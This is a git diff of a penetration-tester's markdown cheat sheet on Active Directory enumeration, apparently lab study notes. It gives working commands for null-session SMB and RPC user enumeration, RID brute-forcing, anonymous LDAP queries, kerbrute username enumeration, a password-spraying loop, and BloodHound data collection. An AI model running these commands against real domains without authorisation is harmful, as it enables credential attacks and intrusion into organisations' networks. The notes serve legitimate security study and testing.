@@ -1,24 +1,18 @@
----
-title: "Active Directory Enumeration"
-stage: "1 - Information Gathering"
-tags: [active-directory, ldap, kerberos, bloodhound, netexec, kerbrute]
----
-
-# Active Directory Enumeration
+## Active Directory Enumeration
 
 Once you can see a Domain Controller, the goal is to map users, groups, computers, ACLs, and trust relationships before authenticating with anything. Most AD attack paths fall directly out of solid enumeration.
 
 ---
 
-## Quick Wins (before you have creds)
+### Quick Wins (before you have creds)
 
 ```bash
-# Null-session SMB
+## Null-session SMB
 nxc smb <dc-ip> -u '' -p ''
 nxc smb <dc-ip> -u '' -p '' --pass-pol             # password policy
 nxc smb <dc-ip> -u '' -p '' --rid-brute            # users via RID brute
 
-# RPC null session
+## RPC null session
 rpcclient -U "" -N <dc-ip>
 > enumdomusers
 > getdompwinfo
@@ -30,7 +24,7 @@ Generate `users.txt`:
 nxc smb <dc-ip> -u <user> -p <pass> --rid-brute \
   | grep 'SidTypeUser' | cut -d '\' -f2 | cut -d '(' -f1 > users.txt
 
-# Or via rpcclient
+## Or via rpcclient
 rpcclient -U "" -N <dc-ip> -c "enumdomusers" \
   | awk -F'[][]' '{print $2}' | cut -d' ' -f1 > users.txt
 ```
@@ -43,27 +37,27 @@ for i in $(seq 500 2000); do
 done
 ```
 
-## LDAP
+### LDAP
 
 ```bash
-# Anonymous bind test
+## Anonymous bind test
 ldapsearch -x -H ldap://<dc-ip> -s base
 
-# Query objects (naming context must match)
+## Query objects (naming context must match)
 ldapsearch -x -H ldap://<dc-ip> -b "dc=tryhackme,dc=loc" "(objectClass=person)"
 
-# Domain-joined computers via netexec
+## Domain-joined computers via netexec
 nxc ldap <dc-ip> -d <domain> -u <user> -p <pass> --computers
 
-# Just the computer names
+## Just the computer names
 nxc ldap <dc-ip> -d <domain> -u <user> -p <pass> --computers \
   | grep '\$' | grep -vE '\[\*\]|\[\+\]|\[-\]'
 
-# Resolve a computer to its IP
+## Resolve a computer to its IP
 dig +short <machine>.<domain> @<dc-ip>
 ```
 
-## enum4linux-ng
+### enum4linux-ng
 
 SMB + LDAP one-shot:
 
@@ -71,18 +65,18 @@ SMB + LDAP one-shot:
 enum4linux-ng -A -u 'user' -p 'pass' <ip>
 ```
 
-## Kerbrute
+### Kerbrute
 
 ```bash
-# Install
+## Install
 wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
 chmod +x kerbrute_linux_amd64
 sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
 
-# Username enumeration
+## Username enumeration
 kerbrute userenum --dc <dc-ip> -d <domain> users.txt
 
-# Password spray (clock skew must be < 3h)
+## Password spray (clock skew must be < 3h)
 while IFS= read -r line; do
   kerbrute passwordspray -d <domain> --dc <dc-ip> users.txt "$line"
 done < trim_pass.txt | grep "VALID LOGIN"
@@ -90,15 +84,15 @@ done < trim_pass.txt | grep "VALID LOGIN"
 
 ⚠ If clock skew breaks Kerberos, fix it: `sudo ntpdate <dc-ip>` or `sudo date -s "<time>"`.
 
-## BloodHound
+### BloodHound
 
-### Easy way — remote collection from Kali
+#### Easy way — remote collection from Kali
 
 ```bash
 bloodhound-python -u <user> -p '<pass>' -d <domain>.local -ns <dc-ip> -c All
 ```
 
-### Manual way — SharpHound on a victim
+#### Manual way — SharpHound on a victim
 
 On Windows host:
 
@@ -112,13 +106,13 @@ Pull `loot.zip` back to Kali:
 scp Administrator@<victim>:/C:<loot-path> .
 ```
 
-### Visualize
+#### Visualize
 
 ```bash
 sudo apt install bloodhound
 neo4j console &        # or systemctl start neo4j
 bloodhound             # login admin:admin
-# Upload loot.zip / json dirs in the UI
+## Upload loot.zip / json dirs in the UI
 ```
 
 Use the pre-built queries:
@@ -128,13 +122,13 @@ Use the pre-built queries:
 - *AS-REP Roastable users*
 - *Computers where this user has admin rights*
 
-## Server Manager (after RDP into a DC)
+### Server Manager (after RDP into a DC)
 
-```text
+```bash
 Tools → Active Directory Users and Computers   (GUI enum)
 ```
 
-## See Also
-- [AD Initial Access](../3-exploitation/05-ad-initial-access.rmd) — ASREPRoasting, Kerberoasting, pass-the-hash.
-- [Kerberos Attacks](../5-lateral-movement/03-kerberos-attacks.rmd) — constrained delegation, golden ticket.
-- [ACL Abuse with bloodyAD](../5-lateral-movement/04-acl-abuse-bloodyad.rmd) — once BloodHound shows you ACL paths.
+### See Also
+- [AD Initial Access](../3-exploitation/05-ad-initial-access.md) — ASREPRoasting, Kerberoasting, pass-the-hash.
+- [Kerberos Attacks](../5-lateral-movement/03-kerberos-attacks.md) — constrained delegation, golden ticket.
+- [ACL Abuse with bloodyAD](../5-lateral-movement/04-acl-abuse-bloodyad.md) — once BloodHound shows you ACL paths.
